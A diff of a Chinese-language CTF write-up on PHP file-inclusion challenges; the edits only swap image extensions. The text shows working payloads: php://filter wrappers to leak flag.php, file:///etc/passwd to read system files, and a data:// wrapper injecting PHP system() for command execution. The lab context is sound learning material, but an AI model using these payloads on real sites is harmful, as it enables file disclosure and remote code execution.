@@ -8,22 +8,22 @@ permalink: /ctf-writeups/ctf-file-include
 
 
 # 1.EZFL
-![](/images/20260420215603.png)
+![](/images/20260420215603.webp)
 我们随便点一下旁边的文件，发现url一直有个file，就想到了文件包含，直接查看源码后发现这个
-![](/images/20260420221204.png)
+![](/images/20260420221204.webp)
 base64解码后是flag is in /flag.txt
 # 2.EZFL1
-![](/images/20260420221609.png)
+![](/images/20260420221609.webp)
 和上一题一样，直接查看源码
-![](/images/20260420221642.png)
+![](/images/20260420221642.webp)
 base64解码后**The flag is right in flag.php, but you'll never be able to see it.**翻译是flag 就在 flag.php 里，但你永远无法看到它。
 伪协议：?file=php://filter/read=convert.base64-encode/resource=flag.php
-后得到![](/images/20260420222157.png)
+后得到![](/images/20260420222157.webp)
 base64解码后拿到flag
 
 
 # 3.EZFL2
-![](/images/20260420222412.png)
+![](/images/20260420222412.webp)
 和上一题一样
 <!-- include($file); -->
 <!-- VGhlIGZsYWcgaXMgcmlnaHQgaW4gZmxhZy5waHAsIGJ1dCB5b3UnbGwgbmV2ZXIgYmUgYWJsZSB0byBzZWUgaXQuIA== -->
@@ -31,10 +31,10 @@ base64解码后拿到flag
 于是换个编码试试?file=php://filter/convert.iconv.utf-8.utf-16/resource=flag.php，拿到flag
 
 # 4.EZFL3
-![](/images/20260420225143.png)
+![](/images/20260420225143.webp)
 和之前一样，依旧查看页面源码，<!-- include($file); --> <!-- VGhlcmUgYXJlIG5vIG1vcmUgaGludHMgZm9yIHlvdSwga2lkLiBGcm9tIG5vdyBvbiwgeW91IGhhdmUgdG8gcmVseSBvbiB5b3Vyc2VsZi4= -->
 不过这次base64解码是**There are no more hints for you, kid. From now on, you have to rely on yourself.**翻译就是:不再给你更多提示了，孩子。从现在起，你得靠自己了。** 
-当然一头雾水，查看之前的笔记，想到可以使用file:///etc/passwd来查看本地文件![](/images/20260421183227.png)
+当然一头雾水，查看之前的笔记，想到可以使用file:///etc/passwd来查看本地文件![](/images/20260421183227.webp)
 我们可以尝试查看源码找线索
 
 ```bash
@@ -55,7 +55,7 @@ include($file);   // ← 直接包含，没有任何过滤！
 ```bash
 /?file=data://text/plain,<?php system('find / -name "flag*" 2>/dev/null');?>
 ```
-![](/images/20260421185408.png)
+![](/images/20260421185408.webp)
 很多，我们找到了flag在flag-mZXg2wdHqRagAiDBzopwfEd4ymaOiN.txt
 ```bash
 /?file=file:///flag-mZXg2wdHqRagAiDBzopwfEd4ymaOiN.txt
